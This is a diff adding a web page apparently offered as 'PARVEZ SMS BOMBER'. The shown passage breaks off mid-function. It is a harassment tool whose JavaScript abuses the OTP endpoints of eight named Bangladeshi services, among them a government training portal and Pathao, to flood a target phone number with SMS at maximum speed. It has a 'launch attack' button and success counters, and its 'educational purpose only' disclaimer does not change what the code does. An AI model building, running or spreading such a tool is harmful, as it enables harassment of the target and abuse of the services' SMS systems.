@@ -1,0 +1,1400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PARVEZ SMS BOMBER | @all_in_one_63</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Cyberpunk/Hacker Style */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', 'Segoe UI', monospace;
+        }
+        
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 40, 0, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0, 0, 40, 0.1) 0%, transparent 20%);
+        }
+        
+        /* Matrix Rain Effect */
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+            pointer-events: none;
+        }
+        
+        /* Cyber Grid Background */
+        .cyber-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 0, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: -1;
+            opacity: 0.3;
+        }
+        
+        /* Scan Lines */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                transparent 50%,
+                rgba(0, 255, 0, 0.02) 50%
+            );
+            background-size: 100% 4px;
+            z-index: -1;
+            pointer-events: none;
+            animation: scan 10s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100vh); }
+        }
+        
+        /* Glitch Effect */
+        .glitch {
+            position: relative;
+            animation: glitch 5s infinite;
+        }
+        
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            1% { transform: translate(-2px, 2px); }
+            2% { transform: translate(-2px, -2px); }
+            3% { transform: translate(2px, 2px); }
+            4% { transform: translate(2px, -2px); }
+            5% { transform: translate(0); }
+        }
+        
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(10, 20, 10, 0.85);
+            border-radius: 0;
+            padding: 30px;
+            border: 2px solid #00ff00;
+            box-shadow: 
+                0 0 30px rgba(0, 255, 0, 0.3),
+                inset 0 0 30px rgba(0, 255, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, 
+                transparent, 
+                #00ff00, 
+                #00ff00, 
+                #00ff00, 
+                transparent
+            );
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #00ff00;
+        }
+        
+        .header h1 {
+            font-size: 3.5rem;
+            color: #00ff00;
+            text-shadow: 
+                0 0 10px #00ff00,
+                0 0 20px #00ff00,
+                0 0 30px #00ff00;
+            margin-bottom: 15px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            animation: textGlow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes textGlow {
+            from { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
+            to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00, 0 0 40px #00ff00; }
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #00cc00;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        .tagline {
+            color: #008800;
+            font-size: 1rem;
+            font-style: italic;
+        }
+        
+        /* Input Grid */
+        .input-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 12px;
+            font-weight: bold;
+            color: #00ff00;
+            font-size: 1.1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #008800;
+            background: rgba(0, 20, 0, 0.8);
+            color: #00ff00;
+            font-size: 18px;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            background: rgba(0, 30, 0, 0.9);
+        }
+        
+        .input-group input::placeholder {
+            color: #008800;
+            opacity: 0.7;
+        }
+        
+        /* Buttons */
+        .button-container {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            flex: 1;
+            min-width: 200px;
+            padding: 20px 30px;
+            border: none;
+            border-radius: 0;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+            background: transparent;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        #startBtn {
+            background: rgba(0, 40, 0, 0.8);
+        }
+        
+        #startBtn:hover {
+            background: rgba(0, 60, 0, 0.9);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.6);
+            transform: translateY(-3px);
+        }
+        
+        #stopBtn {
+            background: rgba(40, 0, 0, 0.8);
+            border-color: #ff0000;
+            color: #ff0000;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
+        }
+        
+        #stopBtn:hover {
+            background: rgba(60, 0, 0, 0.9);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
+            transform: translateY(-3px);
+        }
+        
+        #stopBtn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
+        }
+        
+        #resetBtn {
+            background: rgba(40, 40, 0, 0.8);
+            border-color: #ffff00;
+            color: #ffff00;
+            box-shadow: 0 0 15px rgba(255, 255, 0, 0.3);
+        }
+        
+        #resetBtn:hover {
+            background: rgba(60, 60, 0, 0.9);
+            box-shadow: 0 0 30px rgba(255, 255, 0, 0.6);
+            transform: translateY(-3px);
+        }
+        
+        /* Stats */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid #00ff00;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff00, transparent);
+            animation: slide 2s linear infinite;
+        }
+        
+        @keyframes slide {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .stat-value {
+            font-size: 3rem;
+            font-weight: bold;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 10px;
+        }
+        
+        .stat-label {
+            font-size: 1rem;
+            color: #00cc00;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        /* Progress Bar */
+        .progress-container {
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid #00ff00;
+            padding: 25px;
+            margin-bottom: 40px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+        }
+        
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            color: #00ff00;
+            font-size: 1.2rem;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            background: rgba(0, 30, 0, 0.8);
+            border: 1px solid #008800;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #008800, #00ff00);
+            width: 0%;
+            transition: width 0.1s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: progressShimmer 1s infinite;
+        }
+        
+        @keyframes progressShimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        /* Logs Container */
+        .logs-container {
+            background: rgba(0, 10, 0, 0.9);
+            border: 1px solid #00ff00;
+            padding: 20px;
+            height: 300px;
+            overflow-y: auto;
+            margin-bottom: 40px;
+            font-family: 'Courier New', monospace;
+            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.1);
+        }
+        
+        .logs-container::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        .logs-container::-webkit-scrollbar-track {
+            background: rgba(0, 20, 0, 0.8);
+        }
+        
+        .logs-container::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        .log {
+            padding: 10px 15px;
+            margin-bottom: 10px;
+            border-left: 3px solid #00ff00;
+            background: rgba(0, 30, 0, 0.3);
+            font-size: 14px;
+            animation: logEntry 0.3s;
+        }
+        
+        @keyframes logEntry {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .log.success {
+            border-left-color: #00ff00;
+            color: #00ff00;
+        }
+        
+        .log.error {
+            border-left-color: #ff0000;
+            color: #ff0000;
+        }
+        
+        .log.info {
+            border-left-color: #00ffff;
+            color: #00ffff;
+        }
+        
+        .log.warning {
+            border-left-color: #ffff00;
+            color: #ffff00;
+        }
+        
+        /* API Grid */
+        .api-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+        
+        .api-card {
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid #008800;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .api-card:hover {
+            border-color: #00ff00;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+            transform: translateY(-3px);
+        }
+        
+        .api-card.active {
+            border-color: #00ff00;
+            background: rgba(0, 40, 0, 0.7);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+        
+        .api-status {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+        
+        .api-status.idle {
+            background: #008800;
+            box-shadow: 0 0 5px #008800;
+        }
+        
+        .api-status.active {
+            background: #ffff00;
+            box-shadow: 0 0 10px #ffff00;
+            animation: pulse 1s infinite;
+        }
+        
+        .api-status.success {
+            background: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        .api-status.error {
+            background: #ff0000;
+            box-shadow: 0 0 10px #ff0000;
+        }
+        
+        /* Terminal Output */
+        .terminal {
+            background: #000;
+            color: #00ff00;
+            padding: 20px;
+            border: 2px solid #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+        
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #00ff00;
+        }
+        
+        .terminal-content {
+            height: 150px;
+            overflow-y: auto;
+        }
+        
+        /* Footer */
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #008800;
+        }
+        
+        .disclaimer {
+            padding: 20px;
+            background: rgba(40, 0, 0, 0.5);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
+        }
+        
+        .hacker-note {
+            padding: 15px;
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            font-size: 12px;
+            font-style: italic;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        /* Telegram Button - Cyber Style */
+        .telegram-btn {
+            background: linear-gradient(45deg, #0088cc, #34b7f1);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            font-size: 28px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            box-shadow: 
+                0 0 20px rgba(52, 183, 241, 0.5),
+                0 0 40px rgba(52, 183, 241, 0.3);
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 1000;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(5deg); }
+        }
+        
+        .telegram-btn:hover {
+            transform: scale(1.2) rotate(15deg);
+            box-shadow: 
+                0 0 30px rgba(52, 183, 241, 0.8),
+                0 0 60px rgba(52, 183, 241, 0.5);
+        }
+        
+        .telegram-btn::after {
+            content: '@all_in_one_63';
+            position: absolute;
+            right: 70px;
+            background: rgba(0, 0, 0, 0.9);
+            color: #34b7f1;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-size: 12px;
+            white-space: nowrap;
+            opacity: 0;
+            transform: translateX(20px);
+            transition: all 0.3s;
+            pointer-events: none;
+            border: 1px solid #34b7f1;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .telegram-btn:hover::after {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        /* Cyber Terminal Text */
+        .cyber-text {
+            color: #00ff00;
+            text-shadow: 0 0 5px #00ff00;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Speed Indicator */
+        .speed-indicator {
+            text-align: center;
+            padding: 10px;
+            background: rgba(0, 30, 0, 0.5);
+            border: 1px solid #00ff00;
+            margin-bottom: 20px;
+            color: #00ff00;
+            font-size: 1.1rem;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2.5rem;
+            }
+            
+            .button-container {
+                flex-direction: column;
+            }
+            
+            .btn {
+                min-width: 100%;
+            }
+            
+            .stats-container {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .telegram-btn {
+                width: 50px;
+                height: 50px;
+                font-size: 24px;
+                bottom: 20px;
+                right: 20px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+                margin: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .stats-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .input-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Rain Effect -->
+    <canvas id="matrix"></canvas>
+    <div class="cyber-grid"></div>
+    <div class="scanlines"></div>
+    
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="glitch">PARVEZ SMS BOMBER</h1>
+            <p class="subtitle">CYBER ATTACK SYSTEM</p>
+            <p class="tagline">[ EDUCATIONAL PURPOSE ONLY ]</p>
+            <div class="cyber-text" style="margin-top: 10px;">
+                > INITIALIZING SYSTEM... <span class="blink">█</span>
+            </div>
+        </div>
+        
+        <!-- Speed Indicator -->
+        <div class="speed-indicator">
+            <i class="fas fa-bolt"></i> MAXIMUM SPEED ACTIVATED - NO DELAY BETWEEN SMS
+        </div>
+        
+        <!-- Terminal -->
+        <div class="terminal">
+            <div class="terminal-header">
+                <span>> SYSTEM TERMINAL</span>
+                <span>v1.0</span>
+            </div>
+            <div class="terminal-content" id="terminalContent">
+                > SYSTEM BOOTING... OK<br>
+                > API MODULES LOADING... OK<br>
+                > SMS GATEWAY INITIALIZED... OK<br>
+                > MAXIMUM SPEED MODE: ACTIVE<br>
+                > READY FOR OPERATION<br>
+                ><span class="blink">█</span>
+            </div>
+        </div>
+        
+        <!-- Input Grid -->
+        <div class="input-grid">
+            <div class="input-group">
+                <label for="phoneNumber"><i class="fas fa-mobile-alt"></i> TARGET NUMBER</label>
+                <input type="text" id="phoneNumber" placeholder="ENTER TARGET (e.g., 01712345678)" value="01700000000" maxlength="11">
+            </div>
+            
+            <div class="input-group">
+                <label for="count"><i class="fas fa-bomb"></i> PAYLOAD COUNT</label>
+                <input type="number" id="count" min="1" max="100" value="10">
+            </div>
+        </div>
+        
+        <!-- Button Container -->
+        <div class="button-container">
+            <button class="btn" id="startBtn">
+                <i class="fas fa-play"></i> LAUNCH ATTACK
+            </button>
+            <button class="btn" id="stopBtn" disabled>
+                <i class="fas fa-stop"></i> ABORT MISSION
+            </button>
+            <button class="btn" id="resetBtn">
+                <i class="fas fa-redo"></i> SYSTEM RESET
+            </button>
+        </div>
+        
+        <!-- Stats Container -->
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-value" id="sentCount">0</div>
+                <div class="stat-label">PAYLOADS SENT</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="successCount">0</div>
+                <div class="stat-label">SUCCESSFUL</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="errorCount">0</div>
+                <div class="stat-label">FAILED</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="timeElapsed">0s</div>
+                <div class="stat-label">TIME ELAPSED</div>
+            </div>
+        </div>
+        
+        <!-- Progress -->
+        <div class="progress-container">
+            <div class="progress-header">
+                <span>> ATTACK PROGRESS</span>
+                <span id="progressText">0%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressBar"></div>
+            </div>
+            <div style="display: flex; justify-content: space-between; margin-top: 10px; color: #00cc00;">
+                <span>> STATUS: <span id="statusText">READY</span></span>
+                <span>> REMAINING: <span id="remainingCount">10</span></span>
+            </div>
+        </div>
+        
+        <!-- Logs Container -->
+        <div class="logs-container" id="logsContainer">
+            <div class="log info">
+                > SYSTEM READY FOR SMS BOMBING OPERATION
+            </div>
+            <div class="log info">
+                > SET TARGET NUMBER AND PAYLOAD COUNT
+            </div>
+            <div class="log info">
+                > CLICK 'LAUNCH ATTACK' TO BEGIN
+            </div>
+            <div class="log info">
+                > MAXIMUM SPEED: NO DELAY BETWEEN SMS
+            </div>
+        </div>
+        
+        <!-- API Grid -->
+        <div>
+            <h3 class="cyber-text" style="margin-bottom: 20px; font-size: 1.5rem;">
+                <i class="fas fa-server"></i> ACTIVE API GATEWAYS
+            </h3>
+            <div class="api-grid" id="apiList">
+                <!-- APIs will be loaded here -->
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <div class="disclaimer">
+                <strong>> LEGAL WARNING:</strong><br>
+                THIS TOOL IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.<br>
+                UNAUTHORIZED USE FOR HARASSMENT OR ILLEGAL ACTIVITIES IS STRICTLY PROHIBITED.<br>
+                USER IS SOLELY RESPONSIBLE FOR ANY MISUSE. USE AT YOUR OWN RISK.
+            </div>
+            
+            <div class="hacker-note">
+                > CYBER SECURITY RESEARCH PROJECT | DEVELOPED FOR EDUCATIONAL USE
+            </div>
+        </div>
+    </div>
+    
+    <!-- Telegram Button -->
+    <button class="telegram-btn" id="telegramBtn" title="Contact Admin: @all_in_one_63">
+        <i class="fab fa-telegram-plane"></i>
+    </button>
+
+    <script>
+        // ============================================
+        // MATRIX RAIN EFFECT
+        // ============================================
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const letters = '01';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for(let i = 0; i < columns; i++) {
+            drops[i] = 1;
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#00ff00';
+            ctx.font = fontSize + 'px monospace';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                
+                drops[i]++;
+            }
+        }
+        
+        // ============================================
+        // API DEFINITIONS (MAXIMUM SPEED - NO DELAY)
+        // ============================================
+        const apis = [
+            {
+                id: 1,
+                name: "Training.gov.bd",
+                func: function(number) {
+                    return fetch("https://training.gov.bd/backoffice/api/user/sendOtp", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({"mobile": number})
+                    });
+                }
+            },
+            {
+                id: 2,
+                name: "Qcoom Auth",
+                func: function(number) {
+                    return fetch("https://auth.qcoom.com/api/v1/otp/send", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({"mobileNumber": `+88${number}`})
+                    });
+                }
+            },
+            {
+                id: 3,
+                name: "Pathao",
+                func: function(number) {
+                    return fetch("https://api.pathao.com/v2/auth/register", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({
+                            "country_prefix": "880",
+                            "national_number": number.substring(1),
+                            "country_id": 1
+                        })
+                    });
+                }
+            },
+            {
+                id: 4,
+                name: "Arogga",
+                func: function(number) {
+                    return fetch("https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=141.0.0.0&os=Windows&osv=10", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({"phone": number})
+                    });
+                }
+            },
+            {
+                id: 5,
+                name: "Chorki",
+                func: function(number) {
+                    return fetch("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({"number": `+88${number}`})
+                    });
+                }
+            },
+            {
+                id: 6,
+                name: "Shikho",
+                func: function(number) {
+                    return fetch("https://api.shikho.com/public/activity/otp", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({"phone": number, "intent": "ap-discount-request"})
+                    });
+                }
+            },
+            {
+                id: 7,
+                name: "Bioscope",
+                func: function(number) {
+                    return fetch("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({"number": number})
+                    });
+                }
+            },
+            {
+                id: 8,
+                name: "BD Tickets",
+                func: function(number) {
+                    return fetch("https://api.bdtickets.com:20100/v1/auth", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({
+                            "createUserCheck": true,
+                            "phoneNumber": number,
+                            "applicationChannel": "WEB_APP"
+                        })
+                    });
+                }
+            }
+        ];
+        
+        // ============================================
+        // APPLICATION STATE
+        // ============================================
+        let isBombing = false;
+        let sentCount = 0;
+        let successCount = 0;
+        let errorCount = 0;
+        let startTime = 0;
+        let timerInterval = null;
+        let apiStatus = {};
+        let totalMessages = 0;
+        
+        // ============================================
+        // DOM ELEMENTS
+        // ============================================
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const countInput = document.getElementById('count');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const resetBtn = document.getElementById('resetBtn');
+        const sentCountEl = document.getElementById('sentCount');
+        const successCountEl = document.getElementById('successCount');
+        const errorCountEl = document.getElementById('errorCount');
+        const timeElapsedEl = document.getElementById('timeElapsed');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        const statusText = document.getElementById('statusText');
+        const remainingCountEl = document.getElementById('remainingCount');
+        const logsContainer = document.getElementById('logsContainer');
+        const apiListEl = document.getElementById('apiList');
+        const telegramBtn = document.getElementById('telegramBtn');
+        const terminalContent = document.getElementById('terminalContent');
+        
+        // ============================================
+        // INITIALIZATION
+        // ============================================
+        function init() {
+            // Start Matrix animation
+            setInterval(drawMatrix, 50);
+            
+            // Initialize API list
+            initApiList();
+            
+            // Update initial values
+            updateCounters();
+            updateRemainingCount();
+            
+            // Add initial log
+            addLog("> SYSTEM INITIALIZED SUCCESSFULLY", "info");
+            addLog("> READY FOR SMS BOMBING OPERATION", "info");
+            addLog("> SET TARGET AND CLICK 'LAUNCH ATTACK'", "info");
+            addLog("> MAXIMUM SPEED MODE: ACTIVE", "info");
+            
+            // Terminal message
+            addTerminalMessage("> PARVEZ SMS BOMBER ONLINE");
+            addTerminalMessage("> ALL SYSTEMS OPERATIONAL");
+            addTerminalMessage("> MAXIMUM SPEED: NO DELAY BETWEEN SMS");
+            
+            // Input validation
+            phoneNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 11) value = value.substring(0, 11);
+                e.target.value = value;
+            });
+            
+            countInput.addEventListener('input', updateRemainingCount);
+            
+            // Window resize handler for Matrix
+            window.addEventListener('resize', function() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+        }
+        
+        // Initialize API List
+        function initApiList() {
+            apiListEl.innerHTML = '';
+            apis.forEach(api => {
+                const apiCard = document.createElement('div');
+                apiCard.className = 'api-card';
+                apiCard.id = `api-${api.id}`;
+                apiCard.innerHTML = `
+                    <div class="api-status idle"></div>
+                    <div>
+                        <div style="color: #00ff00; font-weight: bold;">${api.name}</div>
+                        <div style="color: #008800; font-size: 11px;">GATEWAY ${api.id}</div>
+                    </div>
+                `;
+                apiListEl.appendChild(apiCard);
+                apiStatus[api.id] = 'idle';
+            });
+        }
+        
+        // Update API Status
+        function updateApiStatus(apiId, status) {
+            const apiCard = document.getElementById(`api-${apiId}`);
+            if (!apiCard) return;
+            
+            const statusEl = apiCard.querySelector('.api-status');
+            statusEl.className = 'api-status ' + status;
+            apiStatus[apiId] = status;
+            
+            if (status === 'active') {
+                apiCard.classList.add('active');
+            } else {
+                apiCard.classList.remove('active');
+            }
+        }
+        
+        // Add Log Message
+        function addLog(message, type = 'info') {
+            const logEl = document.createElement('div');
+            logEl.className = `log ${type}`;
+            logEl.innerHTML = `
+                <span style="color: #666;">></span> ${message}
+            `;
+            logsContainer.appendChild(logEl);
+            logsContainer.scrollTop = logsContainer.scrollHeight;
+        }
+        
+        // Add Terminal Message
+        function addTerminalMessage(message) {
+            terminalContent.innerHTML += `<br>${message}<span class="blink">█</span>`;
+            terminalContent.scrollTop = terminalContent.scrollHeight;
+        }
+        
+        // Update Counters
+        function updateCounters() {
+            sentCountEl.textContent = sentCount;
+            successCountEl.textContent = successCount;
+            errorCountEl.textContent = errorCount;
+            
+            const total = parseInt(countInput.value) || 1;
+            const progress = total > 0 ? (sentCount / total) * 100 : 0;
+            progressBar.style.width = `${progress}%`;
+            progressText.textContent = `${Math.round(progress)}%`;
+        }
+        
+        // Update Remaining Count
+        function updateRemainingCount() {
+            const total = parseInt(countInput.value) || 10;
+            const remaining = total - sentCount;
+            remainingCountEl.textContent = remaining;
+        }
+        
+        // Update Timer
+        function updateTimer() {
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            const minutes = Math.floor(elapsed / 60);
+            const seconds = elapsed % 60;
+            timeElapsedEl.textContent = `${minutes > 0 ? minutes + 'm ' : ''}${seconds}s`;
+        }
+        
+        // Send SMS using API (MAXIMUM SPEED - NO DELAY)
+        async function sendSMS(number) {
+            if (apis.length === 0) {
+                addLog("> ERROR: NO API GATEWAYS AVAILABLE", "error");
+                return false;
+            }
+            
+            // Select random API
+            const apiIndex = Math.floor(Math.random() * apis.length);
+            const api = apis[apiIndex];
+            
+            // Update API status
+            updateApiStatus(api.id, 'active');
+            addLog(`> SENDING VIA ${api.name}...`, "info");
+            
+            try {
+                const response = await api.func(number);
+                updateApiStatus(api.id, 'success');
+                
+                if (response.ok) {
+                    addLog(`> SUCCESS: ${api.name} DELIVERED`, "success");
+                    addTerminalMessage(`> SUCCESS: ${api.name} HIT`);
+                    successCount++;
+                    return true;
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch (error) {
+                updateApiStatus(api.id, 'error');
+                addLog(`> FAILED: ${api.name} - ${error.message}`, "error");
+                addTerminalMessage(`> FAILED: ${api.name}`);
+                errorCount++;
+                return false;
+            }
+        }
+        
+        // Start Bombing Process (MAXIMUM SPEED - NO DELAY)
+        async function startBombing() {
+            const number = phoneNumberInput.value.trim();
